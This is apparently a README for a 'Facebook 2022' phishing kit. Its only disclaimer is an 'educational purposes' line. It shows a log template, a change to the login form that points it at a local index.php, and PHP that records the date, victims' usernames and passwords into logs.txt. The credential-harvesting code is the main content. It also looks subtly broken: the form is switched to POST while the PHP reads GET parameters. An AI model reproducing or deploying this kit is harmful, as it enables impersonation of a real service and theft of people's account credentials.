### Facebook 2022 Phishing Page
#### For educational purposes!

### logs.txt
```
Date and Time: (Date and Time)
Username: (Username/Email)
Password: (Password)
```

### index.html (form)
```html
<form class="_9vtf" 
data-testid="royal_login_form" 
action="./index.php"  <!-- replacing facebook login action to local "index.php" -->
method="post"> <!-- replacing "get" to "post" -->
```

### index.php
```php
$username = $_GET["email"]; // get email index from email/username textbox
$password = $_GET["pass"]; // get pass index from password textbox
$date = date("d-m-y h:i:s"); // get current time and date

file_put_contents("logs.txt", "Date: " . $date . "\n", FILE_APPEND); // logs time and date
file_put_contents("logs.txt", "Username: " . $username . "\n" , FILE_APPEND); // logs victims username/email
file_put_contents("logs.txt", "Password: ". $password . "\n\n", FILE_APPEND); // logs victims password
```
